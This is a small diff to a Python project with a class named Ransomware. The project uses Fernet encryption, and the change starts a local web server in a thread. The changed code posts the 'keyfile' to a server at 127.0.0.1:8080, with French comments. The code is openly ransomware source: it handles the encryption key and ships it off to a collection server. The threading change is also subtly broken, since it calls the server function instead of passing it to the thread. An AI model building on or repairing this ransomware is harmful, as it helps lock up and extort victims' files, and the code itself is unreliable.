@@ -4,6 +4,8 @@ from cryptography.fernet import Fernet
 import base64
 import http.server
 import requests
+import threading
+
 
 class Ransomware:
 
@@ -170,11 +172,8 @@ if __name__ == '__main__':
         url = '127.0.0.1:8080'
         files = {'file': open('keyfile', 'rb')}
 
-        server.launch_server(True) #Lancement du serveur Web
+        threading.Thread(server.launch_server(True)).start() #Lancement du serveur Web
         r = requests.post(url, files=files)
 
         #r = requests.get(url='127.0.0.1',params =keyfile, port 8080)
-
-
-
 
